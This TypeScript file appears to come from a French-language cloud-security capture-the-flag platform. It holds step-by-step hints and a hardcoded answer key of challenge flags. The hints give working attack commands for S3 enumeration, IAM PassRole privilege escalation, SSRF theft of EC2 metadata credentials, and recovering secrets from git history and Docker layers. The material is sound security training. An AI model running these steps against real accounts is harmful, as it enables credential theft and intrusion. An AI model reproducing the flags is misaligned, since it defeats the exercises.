/** Indices progressifs par challenge (placeholder tant que l'API n'est pas branchée). */

const specific: Record<string, string[]> = {
  "1.1.1": [
    "Les buckets S3 publics peuvent être interrogés sans authentification grâce à l'option --no-sign-request.",
    "Commencez par lister le contenu : aws s3 ls s3://<bucket> --no-sign-request.",
    "Un fichier flag.txt est présent. Récupérez-le : aws s3 cp s3://<bucket>/flag.txt - --no-sign-request.",
  ],
  "1.2.1": [
    "Le bucket pce-marketing-public est public (--no-sign-request), mais un `aws s3 ls` nu ne montre que la vitrine — le fichier sensible est rangé sous un préfixe non listé.",
    "Énumérez TOUT le bucket : aws s3 ls s3://pce-marketing-public --recursive. Cherchez un préfixe internal/ oublié.",
    "Exfiltrez l'objet caché : aws s3 cp s3://pce-marketing-public/internal/hr/employees-export.csv - --no-sign-request. Le flag est en commentaire.",
  ],
  "1.3.1": [
    "Identifiez-vous (aws sts get-caller-identity) puis auditez vos droits : aws iam get-user-policy --user-name ci-deployer --policy-name ci-deploy-inline. Repérez iam:PassRole + ec2:RunInstances + iam:CreateAccessKey.",
    "Exploitez PassRole : lancez une EC2 avec le rôle admin via aws ec2 run-instances --image-id ami-pce --iam-instance-profile Name=admin-profile. Vous récupérez les privilèges admin.",
    "Avec ces droits, posez une access key persistante : aws iam create-access-key --user-name admin-svc. Le SecretAccessKey renvoyé est le flag.",
  ],
  "1.4.1": [
    "L'app écoute sur http://localhost:8080. L'endpoint /fetch?url=... récupère l'URL côté serveur (SSRF) — testez-le avec une URL quelconque.",
    "Pointez la SSRF vers l'IMDSv1 EC2 : /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ pour lister les rôles.",
    "Volez les credentials du rôle pce-app-role : /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pce-app-role. Le SecretAccessKey est le flag.",
  ],
  "2.1.3": [
    "Listez les policies managées locales : aws iam list-policies --scope Local. Quatre policies existent — l'une porte un nom évocateur (FullAccess).",
    "Inspectez la version PAR DÉFAUT de chaque policy : aws iam get-policy-version --policy-arn <arn> --version-id <v>. Cherchez \"Action\": \"*\" combiné à \"Resource\": \"*\".",
    "Auditez la policy fautive : aws iam audit-policy --policy-arn arn:aws:iam::123456789012:policy/PCE-Deploy-FullAccess. L'audit révèle le flag PCE{...}.",
  ],
  "3.3.1": [
    "Le fichier sensible n'est plus dans le working tree. Listez l'historique : git log --oneline, puis suivez le .env supprimé avec git log -p -- .env.",
    "Cherchez le secret sur TOUS les commits (façon truffleHog) : git grep -n \"PCE{\" $(git rev-list --all) ou git log --all -p | grep AWS_SECRET_ACCESS_KEY.",
    "Affichez le .env d'un ancien commit : git show HEAD~2:.env. La valeur de AWS_SECRET_ACCESS_KEY est le flag PCE{...}.",
  ],
  "4.1.4": [
    "Lisez l'historique de build (cat history.txt) et la config de l'image (cat blobs/sha256/*config.json) : la section Env révèle un REGISTRY_TOKEN codé en dur.",
    "Le fichier deploy-creds.env a été supprimé par un RUN rm (whiteout couche 06), mais reste lisible dans la couche d'origine : cat layers/04/app/deploy-creds.env.",
    "Balayez toutes les couches : grep -r \"PCE{\" . — le REGISTRY_TOKEN est le flag PCE{...}.",
  ],
  "5.1.1": [
    "Comptez les IP sources : jq -r '.Records[].sourceIPAddress' cloudtrail-events.json | sort | uniq -c. Une IP (203.0.113.66) et un user-agent 'kali' détonnent.",
    "Filtrez les actions de l'attaquant : jq '.Records[] | select(.sourceIPAddress==\"203.0.113.66\")' cloudtrail-events.json. Repérez l'AssumeRole non autorisé, StopLogging et GetObject.",
    "L'AssumeRole porte un champ pceFinding avec le flag. Confirmez : verify-finding 203.0.113.66 (ou grep pceFinding cloudtrail-events.json). Le flag est PCE{...}.",
  ],
  "6.3.1": [
    "Lancez l'audit : python3 cis-audit.py. Un contrôle CRITIQUE est en FAIL — repérez la ligne marquée 'A CORRIGER'.",
    "Le finding critique est CIS 2.1.5 (S3 Block Public Access désactivé). Corrigez la config : sed -i 's/\"accountLevel\": false/\"accountLevel\": true/' account-config.json.",
    "Relancez python3 cis-audit.py : quand le score critique atteint 100%, l'audit affiche le flag PCE{...}. Corrigez la config, pas le script.",
  ],
};

const generic = [
  "Lisez attentivement l'énoncé puis explorez l'environnement avec les commandes de base (ls, whoami, help).",
  "Identifiez précisément le service et la mauvaise configuration ciblés par ce challenge.",
  "Une fois la vulnérabilité exploitée, le flag apparaît. Soumettez-le au format PCE{...}.",
];

export function getHints(challengeId: string): string[] {
  return specific[challengeId] ?? generic;
}

/**
 * Flags réels des challenges adossés à un vrai lab Docker (cohérent avec le
 * seed backend `db/seed.js` et les `challenge.json` de chaque lab).
 */
const realFlags: Record<string, string> = {
  "1.1.1": "PCE{s3_public_bucket_recon_2024}",
  "1.2.1": "PCE{s3_exfil_hidden_prefix_2024}",
  "1.3.1": "PCE{passrole_createaccesskey_escalation_2024}",
  "1.4.1": "PCE{imds_ssrf_stolen_role_creds_2024}",
  "2.1.3": "PCE{iam_wildcard_admin_policy_2024}",
  "3.3.1": "PCE{git_history_leaked_aws_key_2024}",
  "4.1.4": "PCE{docker_layer_hardcoded_secret_2024}",
  "5.1.1": "PCE{cloudtrail_unauthorized_assumerole_2024}",
  "6.3.1": "PCE{cis_public_s3_block_2024}",
};

/** Flag attendu en mode démo (cohérent avec le seed backend). */
export function expectedFlag(challengeId: string): string {
  return realFlags[challengeId] ?? `PCE{${challengeId.replace(/\./g, "_")}_flag}`;
}
